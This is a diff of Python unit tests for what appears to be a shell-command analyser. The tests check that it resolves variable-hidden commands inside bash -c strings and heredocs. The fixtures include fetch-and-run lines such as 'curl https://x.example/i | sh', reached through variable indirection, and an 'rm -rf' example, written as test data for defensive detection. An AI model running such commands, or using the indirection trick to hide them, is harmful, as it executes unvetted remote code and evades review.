@@ -86,6 +86,28 @@ def test_bash_c_literal_is_code() -> None:
     assert curl.pipeline is not None
 
 
+def test_bash_c_resolves_its_own_constants() -> None:
+    model = _model("bash -c 'c=curl; $c https://x.example/i | sh'")
+    [curl] = _run(model, "curl")
+    assert "sh" in {c.name for c in model.later_stages(curl)}
+
+
+def test_heredoc_fed_to_sh_resolves_its_own_constants() -> None:
+    model = _model("sh <<'EOF'\nc=curl\n$c https://x.example/i | sh\nEOF")
+    [curl] = _run(model, "curl")
+    assert curl.line == 4
+
+
+def test_embedded_constant_used_before_its_assignment_is_unknown() -> None:
+    model = _model("bash -c '$c https://x.example/i | sh; c=curl'")
+    assert "curl" not in _names(model)
+
+
+def test_embedded_code_still_sees_outer_constants() -> None:
+    model = _model('c=curl\nbash -c "$c https://x.example/i | sh"')
+    assert "curl" in _names(model)
+
+
 def test_sh_c_with_clustered_flags() -> None:
     model = _model("sh -ec 'rm -rf /tmp/x'")
     assert "rm" in _names(model)
